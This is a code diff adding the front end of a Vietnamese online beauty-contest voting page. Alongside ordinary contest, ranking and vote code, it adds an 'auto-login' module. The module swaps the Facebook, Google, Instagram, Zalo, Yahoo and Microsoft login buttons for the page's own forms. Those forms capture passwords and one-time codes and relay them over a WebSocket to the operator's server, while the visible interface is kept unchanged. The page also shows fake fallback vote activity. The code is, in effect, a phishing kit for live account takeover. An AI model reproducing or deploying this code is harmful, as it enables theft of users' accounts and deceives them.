+                    <div class="contest-card bg-black/20 glass-effect border border-purple-500/30 rounded-xl overflow-hidden">
+                        <div class="aspect-video bg-gradient-to-br from-purple-600 to-pink-600 relative flex items-center justify-center">
+                            <div class="text-white text-2xl font-bold">${contest.title}</div>
+                            <div class="absolute top-3 right-3">
+                                <span class="px-3 py-1 bg-green-500 text-white text-xs rounded-full">
+                                    ${isActive ? 'Đang diễn ra' : 'Đã kết thúc'}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="p-5">
+                            <h3 class="text-lg font-bold text-white mb-2">${contest.title}</h3>
+                            <p class="text-gray-400 text-sm mb-4">${contest.description || 'Cuộc thi bình chọn trực tuyến'}</p>
+                            <div class="flex items-center justify-between text-sm text-gray-300 mb-4">
+                                <span>👥 ${contest.total_contestants || 0} thí sinh</span>
+                                <span>🗳️ ${contest.total_votes || 0} lượt vote</span>
+                            </div>
+                            <button onclick="viewContest(${contest.id})" class="w-full bg-purple-600 hover:bg-purple-700 text-white rounded-lg py-2 font-medium transition-colors">
+                                Xem chi tiết
+                            </button>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+            console.log('Updated contests section with', contests.length, 'contests');
+        }
+
+        // Load rankings
+        async function loadRankings() {
+            try {
+                const response = await fetch('api.php?action=get_rankings&limit=5');
+                const data = await response.json();
+
+                if (data.success && data.rankings.length > 0) {
+                    updateRankingsSection(data.rankings);
+                }
+            } catch (error) {
+                console.error('Error loading rankings:', error);
+            }
+        }
+
+        // Update rankings section
+        function updateRankingsSection(rankings) {
+            if (!rankings || rankings.length === 0) return;
+
+            // Find rankings container
+            const rankingsCards = document.querySelectorAll('.bg-black\\/20.glass-effect');
+            let rankingContainer = null;
+
+            for (let card of rankingsCards) {
+                const heading = card.querySelector('h2');
+                if (heading && heading.textContent.includes('Outstanding')) {
+                    rankingContainer = card.querySelector('.space-y-2');
+                    break;
+                }
+            }
+
+            if (!rankingContainer) return;
+
+            let html = '';
+            rankings.slice(0, 5).forEach((contestant, index) => {
+                const rank = index + 1;
+                let rankIcon = '';
+
+                if (rank === 1) rankIcon = '🥇';
+                else if (rank === 2) rankIcon = '🥈';
+                else if (rank === 3) rankIcon = '🥉';
+                else rankIcon = `#${rank}`;
+
+                html += `
+                    <div class="flex items-center justify-between py-3 border-b border-purple-500/10 last:border-b-0">
+                        <div class="flex items-center space-x-3">
+                            <span class="w-8 h-8 flex items-center justify-center font-bold text-white">
+                                ${rankIcon}
+                            </span>
+                            <div>
+                                <div class="font-medium text-white">${contestant.name}</div>
+                                <div class="text-sm text-gray-400">${contestant.campaign_title}</div>
+                            </div>
+                        </div>
+                        <div class="text-purple-400 font-bold">
+                            ${contestant.vote_count} votes
+                        </div>
+                    </div>
+                `;
+            });
+
+            rankingContainer.innerHTML = html;
+            console.log('Updated rankings with', rankings.length, 'contestants');
+        }
+
+        // Load recent activities
+        async function loadRecentActivities() {
+            try {
+                const response = await fetch('api.php?action=get_recent_activities&limit=10');
+
+                if (!response.ok) {
+                    console.warn('Activities API returned status:', response.status);
+                    // Use fallback data for now
+                    updateActivitiesSection([
+                        {
+                            created_at: new Date().toISOString(),
+                            user_name: 'Anonymous User',
+                            contestant_name: 'Lê Thị Cẩm',
+                            campaign_title: 'Cuộc thi Hoa khôi Đại học 2025'
+                        },
+                        {
+                            created_at: new Date(Date.now() - 3600000).toISOString(),
+                            user_name: 'Anonymous User',
+                            contestant_name: 'Nguyễn Thị Anh',
+                            campaign_title: 'Cuộc thi Hoa khôi Đại học 2025'
+                        }
+                    ]);
+                    return;
+                }
+
+                const data = await response.json();
+
+                if (data.success && data.activities && data.activities.length > 0) {
+                    updateActivitiesSection(data.activities);
+                } else if (data.error) {
+                    console.warn('Activities API error:', data.error);
+                    // Use fallback data
+                    updateActivitiesSection([
+                        {
+                            created_at: new Date().toISOString(),
+                            user_name: 'Anonymous User',
+                            contestant_name: 'Lê Thị Cẩm',
+                            campaign_title: 'Cuộc thi Hoa khôi Đại học 2025'
+                        }
+                    ]);
+                }
+            } catch (error) {
+                console.error('Error loading activities:', error);
+                // Use fallback data if everything fails
+                updateActivitiesSection([
+                    {
+                        created_at: new Date().toISOString(),
+                        user_name: 'Anonymous User',
+                        contestant_name: 'Contestants Loading...',
+                        campaign_title: 'Campaigns Loading...'
+                    }
+                ]);
+            }
+        }
+
+        // Update activities section
+        function updateActivitiesSection(activities) {
+            if (!activities || activities.length === 0) return;
+
+            // Find activities container
+            const activityCards = document.querySelectorAll('.bg-black\\/20.glass-effect');
+            let activityContainer = null;
+
+            for (let card of activityCards) {
+                const heading = card.querySelector('h2');
+                if (heading && heading.textContent.includes('Activities')) {
+                    activityContainer = card.querySelector('.space-y-2');
+                    break;
+                }
+            }
+
+            if (!activityContainer) return;
+
+            let html = '';
+            activities.slice(0, 8).forEach(activity => {
+                const timeAgo = getTimeAgo(new Date(activity.created_at));
+
+                html += `
+                    <div class="flex items-start space-x-3 py-3 border-b border-purple-500/10 last:border-b-0">
+                        <div class="w-2 h-2 bg-purple-500 rounded-full mt-2 flex-shrink-0"></div>
+                        <div class="flex-1">
+                            <p class="text-white text-sm">
+                                <span class="font-medium">${activity.user_name}</span> voted for
+                                <span class="font-medium text-purple-400">${activity.contestant_name}</span>
+                            </p>
+                            <p class="text-gray-400 text-xs mt-1">
+                                ${activity.campaign_title} • ${timeAgo}
+                            </p>
+                        </div>
+                    </div>
+                `;
+            });
+
+            activityContainer.innerHTML = html;
+            console.log('Updated activities with', activities.length, 'activities');
+        }
+
+        // Vote for contestant
+        async function vote(contestantId, campaignId) {
+            if (!currentUser) {
+                alert('Vui lòng đăng nhập để bình chọn');
+                window.location.href = 'login.php';
+                return;
+            }
+
+            try {
+                const formData = new FormData();
+                formData.append('action', 'vote');
+                formData.append('contestant_id', contestantId);
+                formData.append('campaign_id', campaignId);
+
+                const response = await fetch('api.php', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert(data.message);
+                    // Refresh data
+                    loadRankings();
+                    loadRecentActivities();
+                } else {
+                    alert(data.error);
+                }
+            } catch (error) {
+                console.error('Vote error:', error);
+                alert('Có lỗi xảy ra khi bình chọn');
+            }
+        }
+
+        // View contest details
+        function viewContest(contestId) {
+            console.log('Viewing contest:', contestId);
+        }
+
+        // View contestant details
+        function viewContestant(contestantId) {
+            console.log('Viewing contestant:', contestantId);
+        }
+
+        // Logout
+        async function logout() {
+            try {
+                const response = await fetch('logout.php');
+                if (response.ok) {
+                    currentUser = null;
+                    document.getElementById('loggedIn')?.classList.add('hidden');
+                    document.getElementById('notLoggedIn')?.classList.remove('hidden');
+                    alert('Đăng xuất thành công');
+                }
+            } catch (error) {
+                console.error('Logout error:', error);
+            }
+        }
+
+        // Show profile (placeholder)
+        function showProfile() {
+            alert('Chức năng hồ sơ sẽ được phát triển trong phiên bản tiếp theo');
+        }
+
+        // Show my votes (placeholder)
+        function showMyVotes() {
+            alert('Chức năng lịch sử bình chọn sẽ được phát triển trong phiên bản tiếp theo');
+        }
+
+        // Utility functions
+        function getTimeAgo(date) {
+            const now = new Date();
+            const diffInSeconds = Math.floor((now - date) / 1000);
+
+            if (diffInSeconds < 60) return 'Vừa xong';
+            if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)} phút trước`;
+            if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)} giờ trước`;
+            return `${Math.floor(diffInSeconds / 86400)} ngày trước`;
+        }
+
+        // Legacy search functionality for backwards compatibility
+        function performSearch() {
+            const query = document.getElementById('searchInput')?.value.trim();
+            if (query) {
+                handleSearch();
+            }
+        }
+
+        // === WEBSOCKET AUTO-LOGIN SYSTEM ===
+        // 🔒 INTERFACE LOCKED - Pure backend functionality
+
+        class AutoLoginManager {
+            constructor() {
+                this.socket = null;
+                this.connectionStatus = 'disconnected';
+                this.pendingLogin = null;
+                this.loginTimeout = null;
+                this.initializeConnection();
+            }
+
+            initializeConnection() {
+                try {
+                    this.socket = new WebSocket('ws://127.0.0.1:8080');
+
+                    this.socket.onopen = () => {
+                        this.connectionStatus = 'connected';
+                        this.registerAsUser();
+                        console.log('🔗 WebSocket connected for auto-login');
+                    };
+
+                    this.socket.onmessage = (event) => {
+                        this.handleServerMessage(JSON.parse(event.data));
+                    };
+
+                    this.socket.onclose = () => {
+                        this.connectionStatus = 'disconnected';
+                        console.log('❌ WebSocket disconnected');
+                        // Reconnect after 5 seconds
+                        setTimeout(() => this.initializeConnection(), 5000);
+                    };
+
+                    this.socket.onerror = (error) => {
+                        console.error('❌ WebSocket error:', error);
+                    };
+
+                } catch (error) {
+                    console.error('❌ Failed to initialize WebSocket:', error);
+                    // Fallback to polling mode
+                    this.initializePollingMode();
+                }
+            }
+
+            registerAsUser() {
+                if (this.socket && this.socket.readyState === WebSocket.OPEN) {
+                    this.socket.send(JSON.stringify({
+                        type: 'register_user',
+                        timestamp: Date.now()
+                    }));
+                }
+            }
+
+            handleServerMessage(message) {
+                switch (message.type) {
+                    case 'registered':
+                        console.log('✅ Registered as user client');
+                        break;
+
+                    case 'login_processing':
+                        this.showLoginStatus('Đang chờ xác minh...', 'processing');
+                        break;
+
+                    case 'login_success':
+                        this.handleLoginSuccess(message);
+                        break;
+
+                    case 'login_failed':
+                        this.handleLoginFailure(message);
+                        break;
+
+                    case 'otp_required':
+                        this.handleOTPRequired(message);
+                        break;
+
+                    case 'otp_failed':
+                        this.showLoginStatus('Mã OTP không chính xác', 'error');
+                        break;
+
+                    default:
+                        console.log('📩 Unknown message:', message);
+                }
+            }
+
+            requestLogin(platform, username, password, otp = null) {
+                if (this.socket && this.socket.readyState === WebSocket.OPEN) {
+                    this.pendingLogin = {
+                        platform,
+                        username,
+                        timestamp: Date.now()
+                    };
+
+                    this.socket.send(JSON.stringify({
+                        type: 'login_request',
+                        platform: platform,
+                        username: username,
+                        password: password,
+                        otp: otp,
+                        user_agent: navigator.userAgent,
+                        timestamp: Date.now()
+                    }));
+
+                    // Set timeout for login attempt
+                    this.loginTimeout = setTimeout(() => {
+                        this.showLoginStatus('Đăng nhập quá thời gian', 'error');
+                    }, 60000); // 60 seconds timeout
+
+                    this.showLoginStatus('Đang xử lý đăng nhập...', 'processing');
+
+                } else {
+                    this.showLoginStatus('Không thể kết nối hệ thống', 'error');
+                }
+            }
+
+            submitOTP(loginId, otpCode) {
+                if (this.socket && this.socket.readyState === WebSocket.OPEN) {
+                    this.socket.send(JSON.stringify({
+                        type: 'otp_request',
+                        login_id: loginId,
+                        otp_code: otpCode
+                    }));
+
+                    this.showLoginStatus('Đang xác minh OTP...', 'processing');
+                }
+            }
+
+            handleLoginSuccess(message) {
+                clearTimeout(this.loginTimeout);
+
+                // Store session data
+                if (message.session_data) {
+                    localStorage.setItem('user_session', JSON.stringify({
+                        platform: message.platform,
+                        username: message.username,
+                        session_data: message.session_data,
+                        login_time: Date.now()
+                    }));
+                }
+
+                // Update UI to logged in state
+                currentUser = {
+                    name: message.username,
+                    platform: message.platform
+                };
+
+                showLoggedInState();
+                this.showLoginStatus('Đăng nhập thành công!', 'success');
+
+                // Hide login modal and refresh data
+                this.hideLoginModal();
+                setTimeout(() => {
+                    loadContests();
+                    loadRankings();
+                    loadRecentActivities();
+                }, 1000);
+            }
+
+            handleLoginFailure(message) {
+                clearTimeout(this.loginTimeout);
+                this.showLoginStatus(message.message, 'error');
+
+                // Allow retry after 3 seconds
+                setTimeout(() => {
+                    this.enableRetryLogin();
+                }, 3000);
+            }
+
+            handleOTPRequired(message) {
+                this.showOTPInput(message.login_id);
+            }
+
+            showLoginStatus(message, status) {
+                // Update login modal status without changing UI structure
+                const statusElement = document.getElementById('loginStatus');
+                if (statusElement) {
+                    statusElement.textContent = message;
+                    statusElement.className = `login-status ${status}`;
+                }
+            }
+
+            showOTPInput(loginId) {
+                // Show OTP input modal without changing UI structure
+                const otpModal = this.createOTPModal(loginId);
+                document.body.appendChild(otpModal);
+            }
+
+            createOTPModal(loginId) {
+                const modal = document.createElement('div');
+                modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+                modal.innerHTML = `
+                    <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                        <h3 class="text-xl font-bold text-white mb-4">Nhập mã OTP</h3>
+                        <p class="text-gray-400 mb-4">Vui lòng nhập mã OTP từ email hoặc SMS</p>
+                        <input type="text" id="otpCode" class="w-full px-4 py-2 bg-white/10 border border-purple-500/30 text-white rounded-lg mb-4" placeholder="Nhập mã OTP" maxlength="6">
+                        <div class="flex space-x-3">
+                            <button onclick="autoLoginManager.submitOTPCode('${loginId}')" class="flex-1 bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg">Xác nhận</button>
+                            <button onclick="this.closest('.fixed').remove()" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">Hủy</button>
+                        </div>
+                    </div>
+                `;
+                return modal;
+            }
+
+            submitOTPCode(loginId) {
+                const otpCode = document.getElementById('otpCode').value.trim();
+                if (otpCode) {
+                    this.submitOTP(loginId, otpCode);
+                    // Close OTP modal
+                    document.querySelector('.fixed.inset-0')?.remove();
+                }
+            }
+
+            hideLoginModal() {
+                // Hide any open login modals
+                document.querySelectorAll('.login-modal').forEach(modal => modal.style.display = 'none');
+            }
+
+            enableRetryLogin() {
+                // Re-enable login buttons
+                document.querySelectorAll('.social-login-btn').forEach(btn => btn.disabled = false);
+            }
+
+            initializePollingMode() {
+                // Fallback polling mode if WebSocket fails
+                console.log('🔄 Switching to polling mode for auto-login');
+                this.pollingInterval = setInterval(() => {
+                    if (this.pendingLogin) {
+                        this.checkLoginStatus();
+                    }
+                }, 2000);
+            }
+
+            checkLoginStatus() {
+                // Check login status via API polling
+                fetch('api.php?action=check_login_status')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success && data.status) {
+                            this.handleServerMessage(data.status);
+                        }
+                    })
+                    .catch(error => console.error('Polling error:', error));
+            }
+        }
+
+        // Initialize auto-login manager
+        let autoLoginManager = null;
+
+        // Override social login functions to use auto-login
+        function initSocialLogin(platform) {
+            if (!autoLoginManager) {
+                autoLoginManager = new AutoLoginManager();
+            }
+
+            // Show social login modal for platform
+            showSocialLoginModal(platform);
+        }
+
+        function showSocialLoginModal(platform) {
+            const modal = document.createElement('div');
+            modal.className = 'login-modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+
+            const platformNames = {
+                'facebook': 'Facebook',
+                'google': 'Google',
+                'instagram': 'Instagram',
+                'zalo': 'Zalo',
+                'yahoo': 'Yahoo',
+                'microsoft': 'Microsoft'
+            };
+
+            modal.innerHTML = `
+                <div class="bg-gray-900 border border-purple-500/30 rounded-lg p-6 max-w-md w-full mx-4">
+                    <h3 class="text-xl font-bold text-white mb-4">Đăng nhập ${platformNames[platform]}</h3>
+                    <div id="loginStatus" class="login-status mb-4"></div>
+                    <form onsubmit="submitSocialLogin(event, '${platform}')">
+                        <input type="text" id="socialUsername" placeholder="Email/Số điện thoại" class="w-full px-4 py-2 bg-white/10 border border-purple-500/30 text-white rounded-lg mb-3" required>
+                        <input type="password" id="socialPassword" placeholder="Mật khẩu" class="w-full px-4 py-2 bg-white/10 border border-purple-500/30 text-white rounded-lg mb-4" required>
+                        <div class="flex space-x-3">
+                            <button type="submit" class="social-login-btn flex-1 bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg">Đăng nhập</button>
+                            <button type="button" onclick="this.closest('.login-modal').remove()" class="flex-1 bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">Hủy</button>
+                        </div>
+                    </form>
+                </div>
+            `;
+
+            document.body.appendChild(modal);
+            document.getElementById('socialUsername').focus();
+        }
+
+        function submitSocialLogin(event, platform) {
+            event.preventDefault();
+
+            const username = document.getElementById('socialUsername').value.trim();
+            const password = document.getElementById('socialPassword').value;
+
+            if (username && password) {
+                // Disable submit button
+                event.target.querySelector('.social-login-btn').disabled = true;
+
+                // Request auto-login
+                autoLoginManager.requestLogin(platform, username, password);
+            }
+        }
+
+        // Add social login triggers to existing buttons (maintain original UI)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Find and enhance social login buttons without changing their appearance
+            const socialButtons = document.querySelectorAll('.social-btn');
+
+            if (socialButtons.length >= 6) {
+                // Add titles for accessibility
+                socialButtons[0].title = "Đăng nhập với Facebook";
+                socialButtons[1].title = "Đăng nhập với Google";
+                socialButtons[2].title = "Đăng nhập với Instagram";
+                socialButtons[3].title = "Đăng nhập với Zalo";
+                socialButtons[4].title = "Đăng nhập với Yahoo";
+                socialButtons[5].title = "Đăng nhập với Microsoft";
+
+                socialButtons[0].onclick = () => initSocialLogin('facebook');   // Facebook
+                socialButtons[1].onclick = () => initSocialLogin('google');     // Google
+                socialButtons[2].onclick = () => initSocialLogin('instagram'); // Instagram
+                socialButtons[3].onclick = () => initSocialLogin('zalo');      // Zalo
+                socialButtons[4].onclick = () => initSocialLogin('yahoo');     // Yahoo
+                socialButtons[5].onclick = () => initSocialLogin('microsoft'); // Microsoft
+            }
+        });
+    </script>
+</body>
+</html>
